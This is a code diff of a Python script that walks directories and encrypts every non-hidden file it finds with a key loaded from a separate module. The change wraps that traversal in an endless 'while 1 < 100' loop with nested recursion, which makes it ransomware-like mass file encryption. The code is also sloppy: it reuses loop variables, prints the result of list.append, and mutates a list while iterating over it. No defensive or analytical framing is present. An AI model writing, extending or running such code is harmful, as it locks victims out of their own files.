@@ -38,28 +38,7 @@ def encrypt(filename, key):
 
 for i in files:
     encrypt(i, load_key.open_key())
-
-for i in directory:
-    os.chdir(i)
-    array = os.listdir()
-    files = []
-    directory = []
-
-    print(array)
-    for i in range(0, len(array)):
-        if os.path.isfile(array[i]):
-            files.append(array[i])
-        else:
-            print(directory.append(array[i]))
-    for f in directory:
-        if f.startswith('.'):
-            directory.remove(f)
-            print("one file removed")
-    print(files)
-    print(directory)
-    for i in files:
-        encrypt(i, load_key.open_key())
-    
+while 1 < 100:
     for i in directory:
         os.chdir(i)
         array = os.listdir()
@@ -78,4 +57,25 @@ for i in directory:
                 print("one file removed")
         print(files)
         print(directory)
-    
+        for i in files:
+            encrypt(i, load_key.open_key())
+        
+        for i in directory:
+            os.chdir(i)
+            array = os.listdir()
+            files = []
+            directory = []
+        
+            print(array)
+            for i in range(0, len(array)):
+                if os.path.isfile(array[i]):
+                    files.append(array[i])
+                else:
+                    print(directory.append(array[i]))
+            for f in directory:
+                if f.startswith('.'):
+                    directory.remove(f)
+                    print("one file removed")
+            print(files)
+            print(directory)
+        
